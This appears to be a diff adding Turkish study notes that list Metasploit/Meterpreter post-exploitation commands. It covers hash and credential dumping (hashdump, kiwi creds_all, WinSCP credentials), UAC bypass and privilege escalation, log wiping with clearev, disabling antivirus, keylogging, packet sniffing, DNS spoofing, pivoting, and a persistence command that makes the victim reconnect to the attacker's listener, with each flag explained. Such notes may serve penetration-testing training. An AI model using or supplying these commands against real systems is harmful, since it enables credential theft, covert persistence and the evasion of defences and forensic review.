@@ -1,0 +1,54 @@
+getuid : yetki kontroluar
+hashdump : hashleri gosterir
+load : yukleme komutu
+kiwi : creds_all tum sifreleri dump eder.
+getsystem : uak kontrolu yoksa yetki yukseltir
+migrate : islemlere goc saglar
+sysinfo : mimari hakkinda bilgi verir 
+clearev : iz siler
+ps : calisan uygulamalari goruntuler
+killav: antivurusleri kapatir
+enable_rdp - rdp servisini aktiflestirir
+bypass_uac -uac asmaya yarar
+netsh wlan show profile DEMIR-DAG key=clear wifi sifresini clear text verir
+keyscan_start keyscan_dump
+search -f *jpg
+search dosya adi
+
+kod : #priv
+ run post/windows/gather/win_privs
+ run post/multi/recon/local_exploit_suggester
+ run hostedit -e <ip>,facebook.com/dns spoof
+ run post/windows/gather/enum_domain
+ run post/windows/gather/credentials/winscp
+ run post/windows/manage/migrate
+ run persistence -X -l 10 -p 12345 -r <targetid>
+ portfwd add -l 1433 -p 1433 -r 10.0.2.7
+ run autoroute -s <subnet> <gatewaysession ornegin 1.session> ornegin : run autoroute -s 192.168.1.10 1
+ run arp_scanner -r <subnet>
+ run getgui -e -u <kullaniciadi> -p <kullanicisifresi>  : bu komut ile uzak masaustu baglantisini acar ancak bunun icin kullanici adi ve sifre bilinmeli>
+ run post/windows/gather/enum_logged_on_users
+
+
+sniff etme: 
+	use sniffer #sniffer aktif hale gelir
+	sniffer_interfaces #interfaceleri goruntuler
+	sniffer_start <interface>
+	sniffer_dump <interface> /tmp/dump.pcap
+
+
+Aşağıdaki persistence -U -i 5 -p 443 -r 192.168.1.71 komutu hangi işlemleri yapıyor?
+
+-U, bir kullanıcı oturum açtığında bizim bilgisayarımıza otomatik bağlantı yapılmasını sağlar.
+
+-i 5 Karşe taraftaki persistence.rb script kodu her 5 saniyede bir bize bağlanmaya çalışır.
+
+-p 443 bizim dinleme yapan bilgisayarımızın dinleme yaptığı port numarasıdır.
+
+-r 192.168.1.71 bizim dinleme yapan bilgisayarımızın IP numarasıdır.
+
+
+guvenlı ssl sertıfıkası ıletısım:
+
+HandlerSSLCert= 
+StagerVerifySSLCert = true
